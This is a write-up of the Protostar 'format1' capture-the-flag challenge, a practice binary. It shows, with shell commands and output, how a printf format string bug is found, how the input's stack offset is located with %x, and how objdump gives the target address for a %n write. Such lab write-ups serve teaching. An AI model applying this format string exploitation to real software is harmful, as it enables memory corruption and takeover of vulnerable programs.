**Format1**

This was not an easy challenge.

If you look closesly at the source code you see that the printf prints string as the format string variable.

```diff
$ printf(string);
```

Let's see what happens if we insert a random string

```diff
$ user@protostar:/opt/protostar/bin$ ./format1 AAAA
AAAAuser@protostar:/opt/protostar/bin$ 
```

The printf prints out out string.
Now let's try a format string.

```diff
$ user@protostar:/opt/protostar/bin$ ./format1 %d
134518284user@protostar:/opt/protostar/bin$ 
```

This looks like a memory address, we can try to print a few with them with %x.
The hints state that objdump -t is our friend (to find target's address) and our input string lies far up in the stack.
We need to find out exactly where lies our input, insert target's address and top it with a %n to modify target with a format string exploit.
Sound complicated? Let us first find out where our string lies

```diff
$ ./format1 "$(python -c "print 'ABCDEFGH' + '%x '*150")"
ABCDEFGH804960c bffff628 8048469 b7fd8304 b7fd7ff4 bffff628 8048435 bffff7eb b7ff1040 804845b b7fd7ff4 8048450 0 bffff6a8 b7eadc76 2 bffff6d4 bffff6e0 b7fe1848 bffff690 ffffffff b7ffeff4 804824d 1 bffff690 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6a8 39f3e985 13a7ff95 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff6d4 8048450 8048440 b7ff1040 bffff6cc b7fff8f8 2 bffff7e1 bffff7eb 0 bffff9b6 bffff9c4 bffff9d8 bffff9fa bffffa0d bffffa17 bfffff07 bfffff45 bfffff59 bfffff70 bfffff81 bfffff89 bfffff99 bfffffa6 bfffffda bfffffe6 0 20 b7fe2414 21 b7fe2000 10 178bfbbf 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7cb 1f bffffff2 f bffff7db 0 0 0 a3000000 c4d03e41 d17d630f 186ae1da 692c8fff 363836 662f2e00 616d726f 41003174 **45444342** 25484746 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 user@protostar:/opt/protostar/bin$ 
```

There it is!

Now we need to find out target's address

```diff
$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target
```

Now, if we look at my python script, I bruteforced the offset of our input (I was lazy). We want to insert in our target address in little endian format.

What? why is it not aligned at all?

This took me hours on hours of debugging, we need to insert a few characters before and after our input to re-align target's address.
Then, we add the %n and look proud!